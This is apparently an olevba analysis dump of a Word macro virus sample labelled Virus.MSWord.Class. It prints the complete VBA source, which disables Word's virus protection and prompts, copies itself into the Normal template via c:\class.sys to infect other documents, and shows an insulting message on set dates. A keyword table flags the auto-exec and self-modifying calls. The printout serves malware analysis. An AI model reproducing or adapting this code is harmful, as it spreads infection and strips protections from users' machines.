olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-1fc279e43cb94db3620937c6c9c63902d189cd6a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-1fc279e43cb94db3620937c6c9c63902d189cd6a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
On Error GoTo out
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
Options.VirusProtection = False
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
Options.SaveNormalPrompt = False
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
Options.ConfirmConversions = False
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If nt > 70 And ad > 0 Then GoTo out
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If nt < 70 Then
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End If
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
host.codemodule.AddFromFile ("c:\class.sys")
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
With host.codemodule
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    For x = 1 To 4
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    .deletelines 1
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    Next x
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End With
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If nt < 70 Then
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    With host.codemodule
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    .replaceline 1, "Sub AutoClose()"
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    .replaceline 71, "Sub ToolsMacro()"
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    End With
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End If
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
With host.codemodule
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    For x = 2 To 72 Step 2
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
    Next x
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End With
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
out:
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End Sub
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
Sub ViewVBCode()
'Nacka1999-11-08 17:42:53HP DeskJet 895C on LPT1:Death Row Records
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
